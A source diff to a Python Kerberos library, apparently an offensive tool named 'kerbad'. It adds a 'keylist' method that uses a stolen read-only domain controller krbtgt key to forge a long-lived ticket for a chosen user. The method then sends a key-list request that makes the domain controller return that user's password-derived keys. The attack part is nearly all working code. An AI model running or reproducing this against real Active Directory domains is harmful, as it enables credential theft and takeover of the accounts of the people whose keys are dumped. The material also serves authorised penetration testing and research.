@@ -17,7 +17,8 @@ from kerbad.protocol.asn1_structs import METHOD_DATA, ETYPE_INFO, ETYPE_INFO2, \
 	Checksum, APOptions, Authenticator, Ticket, AP_REQ, TGS_REQ, CKSUMTYPE, \
 	PA_FOR_USER_ENC, PA_PAC_OPTIONS, PA_PAC_OPTIONSTypes, EncTicketPart, \
 	ChangePasswdDataMS, EncryptionKey, EncKrbPrivPart, HostAddress, KRB_PRIV,\
-	AP_REP
+	AP_REP, KERB_KEY_LIST_REQ, S4UUserID, S4UUserIDOptions, PA_S4U_X509_USER,\
+	TransitedEncoding, TicketFlags
 
 from kerbad.protocol.rfc3244 import KRB5ChangePassword, KRB5CHPWReply, KRB5CHPWResultCode
 from kerbad.protocol.errors import KerberosErrorCode, KerberosError
@@ -90,6 +91,7 @@ class AIOKerberosClient:
 				timestamp = PA_ENC_TS_ENC({'patimestamp': now.replace(microsecond=0), 'pausec': now.microsecond}).dump()
 				self.kerberos_cipher = _enctype_table[supported_encryption_method.value]
 				self.kerberos_cipher_type = supported_encryption_method.value
+				self.server_salt = self.server_supp_enc_methods[supported_encryption_method].encode() if self.server_supp_enc_methods[supported_encryption_method] is not None else None
 				self.kerberos_key = Key(self.kerberos_cipher.enctype, self.credential.get_key_for_enctype(supported_encryption_method, salt = self.server_salt))
 				enc_timestamp = self.kerberos_cipher.encrypt(self.kerberos_key, 1, timestamp, None)
 			else:
@@ -995,3 +997,157 @@ class AIOKerberosClient:
 				logger.warning(f"Clock skew detected. Adjusting local time by {self.clock_skew}. Retrying operation.")
 				return await func(*args, **kwargs)
 			raise
+		
+	async def keylist(self, targetuser:str, targetrealm:str = None):
+		"""
+		To be used with an RODC krbtgt_##### account.
+		This function creates and sends a TGS request to the KDC service, posing as the krbtgt_##### account and requests the keylist of the target user.
+		"""
+
+		parts = self.credential.username.split('_')
+		if len(parts) == 2:
+			kdcnum = int(parts[1])
+		else:
+			kdcnum = 0
+		
+		# first we must find the key type used for the krbtgt account
+		# we prefer AES256, then AES128, then RC4
+		krbtgt_enctype = self.credential.get_preferred_enctype(
+			[
+				EncryptionType.AES256_CTS_HMAC_SHA1_96,
+				EncryptionType.AES128_CTS_HMAC_SHA1_96,
+				EncryptionType.ARCFOUR_HMAC_MD5
+			]
+		)
+		if krbtgt_enctype is None:
+			raise ValueError('No preferred enctype found for krbtgt account!')
+		
+		
+		krbtgt_key_data = self.credential.get_key_for_enctype(krbtgt_enctype)
+		krbtgt_key = Key(krbtgt_enctype.value, krbtgt_key_data)
+		krbtgt_cipher = _enctype_table[krbtgt_enctype.value]
+
+		# create random session key, enctype doesn't really matter here
+		# since we are in the position to decide
+		# using AES256 because why not
+		sessionkey_data = os.urandom(32) # 32 bytes for AES256
+		sessionkey_enctype = EncryptionType.AES256_CTS_HMAC_SHA1_96
+		sessionkey = Key(sessionkey_enctype.value, sessionkey_data)
+		
+		#create encticket, continaing session key
+		encticket_key = EncryptionKey(
+			{
+				'keytype': sessionkey_enctype.value, 
+				'keyvalue': sessionkey_data
+			}
+		)
+
+		now = datetime.datetime.now(datetime.timezone.utc)
+
+		encticket = {}
+		encticket['flags'] = TicketFlags(set(['forwarded', 'renewable', 'enc-pa-rep']))
+		encticket['key'] = encticket_key
+		encticket['crealm'] = targetrealm if targetrealm is not None else self.credential.domain.upper()
+		encticket['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [targetuser]})
+		encticket['transited'] = TransitedEncoding({'tr-type': 0, 'contents': b''})
+		encticket['authtime'] = now.replace(microsecond=0)
+		encticket['starttime'] = now.replace(microsecond=0)
+		endtime = now + datetime.timedelta(days=100)
+		encticket['endtime'] = endtime
+		encticket['renew-till'] = endtime
+
+		encticket = EncTicketPart(encticket)
+		encticket_enc = krbtgt_cipher.encrypt(krbtgt_key, 2, encticket.dump(), None)
+
+		partial_tgt_data = {}
+		partial_tgt_data['pvno'] = krb5_pvno
+		partial_tgt_data['realm'] = self.credential.domain.upper()
+		partial_tgt_data['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': ['krbtgt', self.credential.domain.upper()]})
+		partial_tgt_data['msg-type'] = MESSAGE_TYPE.KRB_TGS_REP.value
+		partial_tgt_data['enc-part'] = EncryptedData(
+			{
+				'kvno': kdcnum << 16,
+				'etype': krbtgt_enctype.value,
+				'cipher': encticket_enc
+			}
+		)
+		
+		authenticator_data = {}
+		authenticator_data['authenticator-vno'] = krb5_pvno
+		#authenticator_data['crealm'] = partial_tgt_data['realm']
+		authenticator_data['crealm'] = encticket['crealm']
+		authenticator_data['cusec'] = now.microsecond
+		authenticator_data['ctime'] = now.replace(microsecond=0)
+		authenticator_data['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [targetuser]})
+		authenticator = Authenticator(authenticator_data)
+
+		cipher = _enctype_table[EncryptionType.AES256_CTS_HMAC_SHA1_96.value]
+		enc_authenticator = cipher.encrypt(sessionkey, 7, authenticator.dump(), None)
+
+		ap_req = {}
+		ap_req['pvno'] = krb5_pvno
+		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
+		ap_req['ap-options'] = APOptions(set())
+		ap_req['authenticator'] = EncryptedData({'etype': EncryptionType.AES256_CTS_HMAC_SHA1_96.value, 'cipher': enc_authenticator})
+		ap_req['ticket'] = Ticket({
+			'tkt-vno': krb5_pvno,
+			'realm': partial_tgt_data['realm'],
+			'sname': partial_tgt_data['sname'],
+			'enc-part': partial_tgt_data['enc-part']
+			}
+		)
+
+		pa_data_1 = {}
+		pa_data_1['padata-type'] = PaDataType.TGS_REQ.value
+		pa_data_1['padata-value'] = AP_REQ(ap_req).dump()
+
+		pa_data_2 = {}
+		pa_data_2['padata-type'] = PaDataType.KEY_LIST_REQ.value
+		#pa_data_2['padata-value'] = KERB_KEY_LIST_REQ([23, 17, 18]).dump()
+		pa_data_2['padata-value'] = KERB_KEY_LIST_REQ([
+			EncryptionType.AES256_CTS_HMAC_SHA1_96.value,
+			EncryptionType.AES128_CTS_HMAC_SHA1_96.value,
+			EncryptionType.ARCFOUR_HMAC_MD5.value,
+			EncryptionType.DES_CBC_CRC.value,
+			EncryptionType.DES_CBC_MD5.value,
+		
+		]).dump()
+
+
+		tgs_body_data = {}
+		tgs_body_data['kdc-options'] = KDCOptions(set(['canonicalize']))
+		tgs_body_data['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': ['krbtgt', self.credential.domain.upper()]})
+		tgs_body_data['realm'] = partial_tgt_data['realm']
+		tgs_body_data['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
+		tgs_body_data['nonce'] = secrets.randbits(31)
+		#tgs_body_data['etype'] = [23, 17, 18, -128]
+		tgs_body_data['etype'] = [
+			EncryptionType.AES256_CTS_HMAC_SHA1_96.value,
+			EncryptionType.AES128_CTS_HMAC_SHA1_96.value,
+			EncryptionType.ARCFOUR_HMAC_MD5.value,
+			EncryptionType.DES_CBC_CRC.value,
+			EncryptionType.DES_CBC_MD5.value,
+		]
+
+		tgs_req_data = {}
+		tgs_req_data['pvno'] = krb5_pvno
+		tgs_req_data['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
+		tgs_req_data['padata'] = [pa_data_1, pa_data_2]
+		tgs_req_data['req-body'] = KDC_REQ_BODY(tgs_body_data)
+
+		tgs_req = TGS_REQ(tgs_req_data)
+
+		logger.debug('[KeylistPartial] Sending request to server')
+		reply = await self.ksoc.sendrecv(tgs_req.dump())
+		if reply.name == 'KRB_ERROR':
+			raise KerberosError(reply, 'KeylistPartial failed!')
+		logger.debug('[KeylistPartial] Got TGS reply, decrypting...')		
+		tgs = reply.native
+		
+		cipher = _enctype_table[int(tgs['enc-part']['etype'])]
+		encTGSRepPart = EncTGSRepPart.load(cipher.decrypt(sessionkey, 8, tgs['enc-part']['cipher'])).native		
+		self.ccache.add_tgs(tgs, encTGSRepPart)
+		logger.debug('[KeylistPartial] Got valid TGS reply')
+		return tgs, encTGSRepPart, sessionkey
+		
+		
